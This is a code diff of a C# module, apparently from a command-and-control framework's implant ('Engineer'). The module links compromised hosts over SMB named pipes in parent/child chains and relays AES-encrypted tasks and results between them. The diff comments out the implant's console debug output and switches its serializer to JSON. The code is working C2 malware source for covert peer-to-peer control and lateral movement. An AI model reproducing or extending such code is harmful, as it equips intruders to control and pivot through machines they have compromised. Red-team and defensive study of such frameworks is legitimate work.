@@ -72,12 +72,12 @@ namespace Engineer.Models
             {
                 if (IsParent)
                 {
-                    Console.WriteLine("starting parent client");
+                    //Console.WriteLine("starting parent client");
                     Task.Run(async () => await Start_ParentClient()); //only started via the Connect command 
                 }
                 else if (!IsParent)
                 {
-                    Console.WriteLine("starting child client");
+                   // Console.WriteLine("starting child client");
                     Task.Run(async () => await Start_ChildClient()); // only started when the engineer is created
                 }
             }
@@ -85,13 +85,13 @@ namespace Engineer.Models
             {
                 if (IsParent)
                 {
-                    Console.WriteLine("starting parent server");
+                    //Console.WriteLine("starting parent server");
                     Task.Run(async () => await Start_ParentServer()); //only started via the Connect command 
 
                 }
                 else if (!IsParent)
                 {
-                    Console.WriteLine("starting child server");
+                   // Console.WriteLine("starting child server");
                     Task.Run(async () => await Start_ChildServer()); // only started when the engineer is created
                 }
             }
@@ -103,7 +103,7 @@ namespace Engineer.Models
             {
                 //make an NamedPipe server and wait for a client connection
                 NamedPipeServerStream pipeServer = new NamedPipeServerStream(NamedPipe, PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.Asynchronous);
-                Console.WriteLine($"starting server on named pipe {NamedPipe}");
+               // Console.WriteLine($"starting server on named pipe {NamedPipe}");
                 Link.Output = $"starting server on named pipe {NamedPipe}";
                 while (!_tokenSource.Token.IsCancellationRequested)
                 {
@@ -126,11 +126,11 @@ namespace Engineer.Models
             }
             catch (Exception e)
             {
-                Console.WriteLine(e.Message);
-                Console.WriteLine(e.StackTrace);
+              //  Console.WriteLine(e.Message);
+               // Console.WriteLine(e.StackTrace);
             }
             
-            Console.WriteLine("THIS SHOULD NOT PRINT");
+            //Console.WriteLine("THIS SHOULD NOT PRINT");
         }
 
         public async Task Start_ParentClient()
@@ -138,22 +138,22 @@ namespace Engineer.Models
             try
             {
                 NamedPipeClientStream pipeClient = new NamedPipeClientStream(Bindip.ToString(), NamedPipe, PipeDirection.InOut, PipeOptions.Asynchronous);
-                Console.WriteLine($"trying to connect to {Bindip} on named pipe {NamedPipe}");
+              //  Console.WriteLine($"trying to connect to {Bindip} on named pipe {NamedPipe}");
                 pipeClient.Connect(10000);
                 if (pipeClient.IsConnected)
                 {
-                    Console.WriteLine($"connected to {Bindip} on named pipe {NamedPipe}");
+                   // Console.WriteLine($"connected to {Bindip} on named pipe {NamedPipe}");
                     Link.Output = $"connected to {Bindip} on named pipe {NamedPipe}";
                     //if pipeserver client is connected, start 2 Task.Runs one reading and one writing to the client 
                     byte[] Id = Encoding.ASCII.GetBytes(Program._metadata.Id);
                     byte[] Sleep = BitConverter.GetBytes(EngCommBase.Sleep);
                     byte[] IdSleep = Id.Concat(Sleep).ToArray();
-                    Console.WriteLine($"sending {IdSleep.Length} bytes");
+                   // Console.WriteLine($"sending {IdSleep.Length} bytes");
                     await pipeClient.WriteAsync(IdSleep, 0, IdSleep.Length);
                     byte[] ChildId = new byte[36];
                     await pipeClient.ReadAsync(ChildId, 0, 36);
                     ChildIdString = Encoding.ASCII.GetString(ChildId);
-                    Console.WriteLine($"got back child id {ChildIdString}");
+                    //Console.WriteLine($"got back child id {ChildIdString}");
                     Program.SmbChildCommModules.TryAdd(ChildIdString, this);
                     ParentToChildData.TryAdd(ChildIdString, new ConcurrentQueue<byte[]>());
                     var readPipeTask = Task.Run(async () => await ReadFromPipe(pipeClient));
@@ -164,10 +164,10 @@ namespace Engineer.Models
             }
             catch (Exception e)
             {
-                Console.WriteLine(e.Message);
-                Console.WriteLine(e.StackTrace);
+               // Console.WriteLine(e.Message);
+               // Console.WriteLine(e.StackTrace);
             }
-            Console.WriteLine("THIS SHOULD NOT PRINT");
+           // Console.WriteLine("THIS SHOULD NOT PRINT");
         }
 
         public async Task Start_ChildServer()
@@ -176,7 +176,7 @@ namespace Engineer.Models
             {
                 //make an NamedPipe server and wait for a client connection
                 NamedPipeServerStream pipeServer = new NamedPipeServerStream(NamedPipe, PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.Asynchronous);
-                Console.WriteLine($"starting server on named pipe {NamedPipe}");
+               // Console.WriteLine($"starting server on named pipe {NamedPipe}");
                 Link.Output = $"starting server on named pipe {NamedPipe}";
                 pipeServer.WaitForConnection();
                 while (!_tokenSource.Token.IsCancellationRequested)
@@ -186,13 +186,13 @@ namespace Engineer.Models
                     byte[] ParentId = ParentIdSleep.Take(36).ToArray();
                     byte[] Sleep = ParentIdSleep.Skip(36).Take(4).ToArray();
                     string ParentIdString = Encoding.ASCII.GetString(ParentId);
-                    Console.WriteLine($"got back parent id byte size of {ParentId.Length}");
-                    Console.WriteLine($"got back parent id {ParentIdString}");
+                   // Console.WriteLine($"got back parent id byte size of {ParentId.Length}");
+                   // Console.WriteLine($"got back parent id {ParentIdString}");
                     EngCommBase.Sleep = BitConverter.ToInt32(Sleep, 0);
-                    Console.WriteLine($"got back parent sleep value {EngCommBase.Sleep}");
+                  //  Console.WriteLine($"got back parent sleep value {EngCommBase.Sleep}");
                     if(Program.SmbParentCommModules.TryAdd(ParentIdString, this))
                     {
-                        Console.WriteLine("added parent id to the smb Parent comm moudle list");
+                       // Console.WriteLine("added parent id to the smb Parent comm moudle list");
                     }
                     ChildToParentData.TryAdd(ParentIdString, new ConcurrentQueue<byte[]>());
                     var firstCheckTask = new EngineerTask
@@ -224,11 +224,11 @@ namespace Engineer.Models
             }
             catch (Exception e)
             {
-                Console.WriteLine(e.Message);
-                Console.WriteLine(e.StackTrace);
+               // Console.WriteLine(e.Message);
+               // Console.WriteLine(e.StackTrace);
             }
             
-            Console.WriteLine("THIS SHOULD NOT PRINT");
+            //Console.WriteLine("THIS SHOULD NOT PRINT");
         }
 
         public async Task Start_ChildClient()
@@ -236,19 +236,19 @@ namespace Engineer.Models
             try
             {
                 NamedPipeClientStream pipeClient = new NamedPipeClientStream(Bindip.ToString(), NamedPipe, PipeDirection.InOut, PipeOptions.Asynchronous);
-                Console.WriteLine($"trying to connect to {Bindip} on named pipe {NamedPipe}");
+                //Console.WriteLine($"trying to connect to {Bindip} on named pipe {NamedPipe}");
                 pipeClient.Connect(10000);
                 if (pipeClient.IsConnected)
                 {
-                    Console.WriteLine($"connected to {Bindip} on named pipe {NamedPipe}");
+                   // Console.WriteLine($"connected to {Bindip} on named pipe {NamedPipe}");
                     Link.Output = $"connected to {Bindip} on named pipe {NamedPipe}";
                     byte[] ParentIdSleep = new byte[40];
                     await pipeClient.ReadAsync(ParentIdSleep,0,40);
                     byte[] ParentId = ParentIdSleep.Take(36).ToArray();
                     byte[] Sleep = ParentIdSleep.Skip(36).Take(4).ToArray();
                     string ParentIdString = Encoding.ASCII.GetString(ParentId);
-                    Console.WriteLine($"got back parent id byte size of {ParentId.Length}");
-                    Console.WriteLine($"got back parent id {ParentIdString}");
+                   // Console.WriteLine($"got back parent id byte size of {ParentId.Length}");
+                   // Console.WriteLine($"got back parent id {ParentIdString}");
                     EngCommBase.Sleep = BitConverter.ToInt32(Sleep, 0);
                     Console.WriteLine($"got back parent sleep value {EngCommBase.Sleep}");
                     Program.SmbParentCommModules.TryAdd(ParentIdString, this);
@@ -282,16 +282,16 @@ namespace Engineer.Models
             }
             catch (Exception e)
             {
-                Console.WriteLine(e.Message);
-                Console.WriteLine(e.StackTrace);
+               // Console.WriteLine(e.Message);
+               // Console.WriteLine(e.StackTrace);
             }
             
-            Console.WriteLine("THIS SHOULD NOT PRINT");
+           // Console.WriteLine("THIS SHOULD NOT PRINT");
         }
 
         public async Task ReadFromPipe(PipeStream pipeserver)
         {
-            Console.WriteLine("starting read from pipe loop");
+           // Console.WriteLine("starting read from pipe loop");
             //read from the named pipe, if the parent is reading from the pipe then this a TaskResponse, if the child is reading from the pipe this is a C2TaskMessage
             try 
             { 
@@ -334,7 +334,7 @@ namespace Engineer.Models
                             byte[] ParentData = new byte[size];
                             await pipeserver.ReadAsync(ParentData, 0, size); // should always be a C2TaskMessage[] , but the data is seralized & encrypted 
                             byte[] seralizedParentData = Encryption.AES_Decrypt(ParentData,Program.MessagePathKey);
-                            C2TaskMessage incomingMessage = seralizedParentData.ProDeserialize<C2TaskMessage>();
+                            C2TaskMessage incomingMessage = seralizedParentData.JsonDeserialize<C2TaskMessage>();
                             //check the C2TaskMessage PathMessage Count if its highrt then 0, read the first item and if that matches the current engineers id add the message to the queue
                             if (incomingMessage.PathMessage.ElementAt(0) == Program._metadata.Id)
                             {
@@ -343,14 +343,14 @@ namespace Engineer.Models
                                 {
                                     // when child reads this if it has more pathing info then this task is meant for one of its children and it should get it ready to send onward. 
                                     var childid = incomingMessage.PathMessage[0];
-                                    var seeralizedMessage = incomingMessage.ProSerialise();
+                                    var seeralizedMessage = incomingMessage.JsonSerialize();
                                     var EncryptedMessage = Encryption.AES_Encrypt(seeralizedMessage,Program.MessagePathKey);
                                     ParentToChildData[childid].Enqueue(EncryptedMessage);
                                 }
                                 //else this task is for this current engineer and should be added to the taskQueue
                                 else
                                 {
-                                    byte[] decryptedTaskData = Encryption.AES_Decrypt(incomingMessage.TaskData,Program.UniqueTaskKey);
+                                    byte[] decryptedTaskData = Encryption.AES_Decrypt(incomingMessage.TaskData.ToArray(), Program.UniqueTaskKey);
                                     HandleResponse(decryptedTaskData);
                                     IsDataInTransit = false;
                                 }
@@ -362,15 +362,15 @@ namespace Engineer.Models
             }
             catch(Exception ex)
             {
-                Console.WriteLine(ex.Message);
-                Console.WriteLine(ex.StackTrace);
+               // Console.WriteLine(ex.Message);
+               // Console.WriteLine(ex.StackTrace);
             }
-            Console.WriteLine("exiting read from pipe loop");
+           // Console.WriteLine("exiting read from pipe loop");
         }
         
         public async Task WriteToPipe(PipeStream pipeserver)
         {
-            Console.WriteLine("starting write to pipe loop");
+            //Console.WriteLine("starting write to pipe loop");
             //write into the named pipe, if the parent is writing into the pipe this is a C2TaskMessage, if the child is writing into the pipe this is a TaskResponse
             try
             {
@@ -397,7 +397,7 @@ namespace Engineer.Models
                         if (childdata.TryDequeue(out byte[] message))
                         {
                             IsDataInTransit = true;
-                            Console.WriteLine("calling send data to parent for self");
+                           // Console.WriteLine("calling send data to parent for self");
                             byte[] size = BitConverter.GetBytes(message.Length);
                             byte[] ComboMessage = size.Concat(message).ToArray();
                             await pipeserver.WriteAsync(ComboMessage, 0, ComboMessage.Length);
@@ -412,7 +412,7 @@ namespace Engineer.Models
                             //if the ChildToParentData dictionary has values for the parent Id , send the data to the parent
                             if (ChildToParentData[Program.SmbParentCommModules.Keys.ElementAt(0)].TryDequeue(out byte[] ForwardedChildData))
                             {
-                                Console.WriteLine("calling send data to parent");
+                                //Console.WriteLine("calling send data to parent");
                                 IsDataInTransit = true;
                                 //concat the size of the message to the front of the message
                                 byte[] size = BitConverter.GetBytes(ForwardedChildData.Length);
@@ -427,10 +427,10 @@ namespace Engineer.Models
             }
             catch(Exception ex)
             {
-                Console.WriteLine(ex.Message);
-                Console.WriteLine(ex.StackTrace);
+               // Console.WriteLine(ex.Message);
+              //  Console.WriteLine(ex.StackTrace);
             }
-            Console.WriteLine("exiting write to pipe loop");
+           // Console.WriteLine("exiting write to pipe loop");
         }
 
         
@@ -448,7 +448,7 @@ namespace Engineer.Models
 
         private bool HandleResponse(byte[] response) //if not null we have stuff to do 
         {
-            var tasks = response.ProDeserialize<List<EngineerTask>>();
+            var tasks = response.JsonDeserialize<List<EngineerTask>>();
 
             if (tasks != null && tasks.Any())
             {
